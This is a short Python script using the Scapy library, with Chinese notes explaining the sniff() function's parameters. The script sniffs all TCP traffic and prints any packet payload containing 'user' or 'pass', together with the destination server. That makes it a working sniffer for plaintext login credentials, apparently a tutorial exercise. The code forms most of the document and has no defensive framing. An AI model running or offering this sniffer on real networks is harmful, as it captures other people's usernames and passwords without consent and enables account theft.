'''
主要功能函数 sniff(filter="",iface="any",prn=function,count=N)
filter: 允许我们对Scapy嗅探的数据包指定一个BPF(Wireshark类型)的过滤器,也可以留空以嗅探所有的数据包。
iface:  设置嗅探器所要嗅探的网卡，留空则对所有网卡进行嗅探。
prn:    指定嗅探到符合过滤器条件的数据包时所调用的回调函数,这个回调函数以接受到的数据包对象作为唯一的参数。
count:  参数指定你需要嗅探的数据包的个数,留空则默认为嗅探无限个。
'''

from scapy.all import *

def pack_callback(packet):
    print(packet.show())
    if packet[TCP].payload:
        mail_packet=str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("Server:%s" % packet[IP].dst)
            print("%s" % packet[TCP].payload)

sniff(filter="tcp", prn=pack_callback)
